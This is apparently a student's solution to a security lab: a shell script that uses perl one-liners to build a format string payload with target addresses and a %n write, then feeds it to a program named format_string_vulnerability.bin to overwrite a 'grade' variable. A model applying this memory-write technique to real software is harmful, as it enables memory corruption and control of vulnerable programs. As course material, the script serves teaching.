#0x0804a01c = grade address
#19th word = address added
perl -e 'print "\x1c\xa0\x04\x08";' > grade.txt
perl -e 'print "\x1b\xa0\x04\x08";' >> grade.txt
perl -e 'print "\x1a\xa0\x04\x08";' >> grade.txt
perl -e 'print "\x19\xa0\x04\x08";' >> grade.txt
perl -e 'print "%1\$49x%19\$n";' >> grade.txt
perl -e 'print " \n";' >> grade.txt 
perl -e 'print "Rock Beom Kim ";' >> grade.txt

./format_string_vulnerability.bin < grade.txt
